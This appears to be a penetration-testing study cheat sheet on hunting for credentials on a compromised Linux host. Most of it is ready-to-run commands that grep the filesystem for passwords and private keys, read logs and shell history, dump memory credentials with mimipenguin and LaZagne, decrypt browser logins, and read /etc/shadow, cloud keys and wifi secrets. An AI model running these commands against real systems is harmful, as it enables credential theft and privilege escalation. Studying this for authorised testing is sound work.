# Credential Hunting in Linux

## Credential Hunting in Linux

Hunting for credentials is one of the first steps once we have access to a system. These low-hanging fruits can give us elevated privileges within seconds or minutes.

### Credential Storage Categories

| **Files**    | **History**          | **Memory**           | **Key-Rings**              |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

### Common Search Patterns

```bash
# General password search
find / -type f -exec grep -l "password" {} \;

# Config files search
find / -name "*.config" -o -name "*.conf" -type f -exec grep -l "pass" {} \;

# Hidden files
find / -name ".*" -type f -exec grep -l "secret" {} \;
```

### Files

#### Configuration Files

```bash
# Find all config files
for l in $(echo ".conf .config .cnf"); do
    echo -e "\nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search for credentials in config files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
    echo -e "\nFile: " $i
    grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

#### Databases

```bash
# Find database files
for l in $(echo ".sql .db .*db .db*"); do
    echo -e "\nDB File extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

#### Notes and Text Files

```bash
# Find text files in home directories
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

#### Scripts

```bash
# Find script files
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
    echo -e "\nFile extension: " $l
    find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

#### Cronjobs

```bash
# Examine system crontab
cat /etc/crontab

# Check cron directories
ls -la /etc/cron.*/
```

#### SSH Keys

```bash
# Find SSH private keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Find SSH public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### History

#### Bash History

```bash
# Check bash history files
tail -n5 /home/*/.bash*
```

#### Logs

Important log files to check:

| **Log File**          | **Description**                                   |
| --------------------- | ------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs                      |
| `/var/log/syslog`     | Generic system activity logs                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs   |
| `/var/log/boot.log`   | Booting information                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs          |
| `/var/log/faillog`    | Failed login attempts                             |
| `/var/log/cron`       | Information related to cron jobs                  |
| `/var/log/mail.log`   | All mail server related logs                      |
| `/var/log/httpd`      | All Apache related logs                           |
| `/var/log/mysqld.log` | All MySQL server related logs                     |

Search logs for sensitive information:

```bash
for i in $(ls /var/log/* 2>/dev/null); do
    GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
    if [[ $GREP ]]; then
        echo -e "\n#### Log file: " $i
        grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
    fi
done
```

### Memory and Cache

#### Using Mimipenguin

```bash
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```

#### Using LaZagne

```bash
sudo python2.7 laZagne.py all
```

### Browser Credentials

#### Firefox Stored Credentials

```bash
# Find Firefox profiles
ls -l .mozilla/firefox/ | grep default

# Check stored logins
cat .mozilla/firefox/[profile_dir]/logins.json | jq .
```

#### Decrypting Firefox Credentials

```bash
python3.9 firefox_decrypt.py
```

### Common Credential Storage Locations

| Component       | Location                                  | Commands/Methods          | What to Look For       |
| --------------- | ----------------------------------------- | ------------------------- | ---------------------- |
| WiFi            | `/etc/NetworkManager/system-connections/` | `cat *.nmconnection`      | `psk=` field           |
| wpa\_supplicant | `/etc/wpa_supplicant/wpa_supplicant.conf` | `cat wpa_supplicant.conf` | `psk=` entries         |
| Libsecret       | `~/.local/share/keyrings/`                | `secret-tool search`      | Stored passwords       |
| KWallet         | `~/.kde/share/apps/kwallet/`              | `kwallet-query -l`        | KDE stored credentials |
| Chromium        | `~/.config/chromium/Default/`             | `sqlite3 Login\ Data`     | Login data, cookies    |
| CLI History     | `~/.bash_history`, `~/.zsh_history`       | `history \| grep -i pass` | Plaintext passwords    |
| Mozilla         | `~/.mozilla/firefox/*.default/`           | `strings key4.db`         | Login credentials      |
| Thunderbird     | `~/.thunderbird/*.default/`               | `cat key4.db`             | Email credentials      |
| Git             | `.git/config`, `~/.gitconfig`             | `git config --list`       | Repository credentials |
| Env Variables   | `/etc/environment`, `~/.bashrc`           | `env \| grep -i pass`     | API keys, tokens       |
| GRUB            | `/etc/grub.d/`, `/boot/grub/`             | `cat grub.cfg`            | Boot passwords         |
| Fstab           | `/etc/fstab`                              | `cat /etc/fstab`          | Mount credentials      |
| AWS             | `~/.aws/credentials`                      | `cat credentials`         | Access keys            |
| Filezilla       | `~/.filezilla/filezilla.xml`              | `cat filezilla.xml`       | FTP credentials        |
| GFTP            | `~/.gftp/bookmarks`                       | `cat bookmarks`           | FTP logins             |
| SSH             | `~/.ssh/`                                 | `cat config, id_rsa`      | Keys, known hosts      |
| Apache          | `/etc/apache2/`                           | `cat .htpasswd`           | Web credentials        |
| Shadow          | `/etc/shadow`                             | `cat /etc/shadow`         | Password hashes        |
| Docker          | `~/.docker/config.json`                   | `cat config.json`         | Registry auth          |
| KeePass         | `*.kdbx` files                            | `keepass2john`            | Database passwords     |
| Sessions        | `/var/lib/php/sessions/`                  | `cat sess_*`              | PHP session data       |
| Keyrings        | `/etc/default/keyrings/`                  | `gnome-keyring-daemon`    | Stored passwords       |
